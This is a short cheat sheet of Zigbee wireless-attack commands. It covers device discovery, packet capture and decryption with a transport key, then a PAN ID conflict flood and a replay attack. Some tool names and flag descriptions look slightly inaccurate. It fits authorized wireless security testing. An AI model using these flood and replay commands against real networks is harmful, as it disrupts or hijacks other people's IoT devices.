### **Zigbee Network Command Operations**

---

#### **1. `sudo zbid`**
- **Function:** Checks the interface for Zigbee devices.
- **Usage:** `sudo zbid`

#### **2. `sudo zbstumbler -c 15 -v`**
- **Function:** Scans Zigbee channels for devices.
- **Usage:** `sudo zbstumbler -c 15 -v`
- `-c 15`: Scans on channel 15.
- `-v`: Verbose mode for detailed output.

#### **3. `sudo zbdump -f 15 -w capture.dump/.pcap`**
- **Function:** Captures Zigbee packets.
- **Usage:** `sudo zbdump -f 15 -w capture.dump/.pcap`
- `-f 15`: Filters packets on channel 15.
- `-w capture.dump/.pcap`: Writes captured packets to `capture.dump` or `.pcap` file.

#### **4. `zbdsniff -f capture.dump -v -k entertransportkey`**
- **Function:** Sniffs packets from a captured file.
- **Usage:** `zbdsniff -f capture.dump -v -k entertransportkey`
- `-f capture.dump`: Specifies the captured file to sniff from.
- `-v`: Enables verbose mode for detailed output.
- `-k entertransportkey`: Uses the specified transport key for decryption.

#### **5. `zbdwireshark -p -c 15`**
- **Function:** Opens captured packets in Wireshark.
- **Usage:** `zbdwireshark -p -c 15`
- `-p`: Specifies to open in promiscuous mode.
- `-c 15`: Filters packets for channel 15.

#### **6. Find EPAN ID from Wireshark data**
- **Process:** Analyze the Wireshark data to locate the Extended PAN ID (EPAN ID) within the Zigbee packets.

#### **7. `zbpanidconflictflood -f 15 -e Enter_epan_id -p pan_id -s coordinator_id`**
- **Function:** Floods the network with conflicting PAN IDs.
- **Usage:** `zbpanidconflictflood -f 15 -e Enter_epan_id -p pan_id -s coordinator_id`
- `-f 15`: Floods on channel 15.
- `-e Enter_epan_id`: Specifies the EPAN ID to flood.
- `-p pan_id`: Specifies the PAN ID to flood.
- `-s coordinator_id`: Specifies the coordinator ID.

#### **8. `zbreplay -f 15 -r capture.dump`**
- **Function:** Initiates a replay attack using captured packets.
- **Usage:** `zbreplay -f 15 -r capture.dump`
- `-f 15`: Filters packets on channel 15.
- `-r capture.dump`: Uses captured packets for the replay attack.

#### **Additional Notes:**
- These commands are used for testing and diagnostics in a Zigbee network.
- It's crucial to have proper authorization and ethical considerations when performing such operations.

---
